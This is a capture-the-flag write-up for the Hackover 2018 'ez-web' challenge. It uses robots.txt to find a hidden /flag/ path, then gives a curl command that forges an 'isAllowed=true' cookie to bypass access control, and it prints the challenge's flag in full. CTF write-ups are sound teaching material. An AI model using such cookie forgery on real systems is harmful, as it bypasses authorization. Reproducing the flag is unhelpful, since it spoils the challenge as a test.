## ez-web
#### challenge
````
Easy web challenge in the slimmest possible design.... namely none.

http://ez-web.ctf.hackover.de:8080

````
### idea
http://ez-web.ctf.hackover.de:8080/robots.txt
```
User-agent: * Disallow: /flag/
```

http://ez-web.ctf.hackover.de:8080/flag/
```
flag.txt
```

http://ez-web.ctf.hackover.de:8080/flag/flag.txt
```
You do not have permission to enter this Area. A mail has been sent to our Admins.
You shall be arrested shortly.
```
The webserver uses one cookie ```isAllowed=false```. Changing this to ```true``` produces:
```
hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n}
```

### script
```shell
curl http://ez-web.ctf.hackover.de:8080/flag/flag.txt --cookie "isAllowed=true"
```

### flag
hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n}
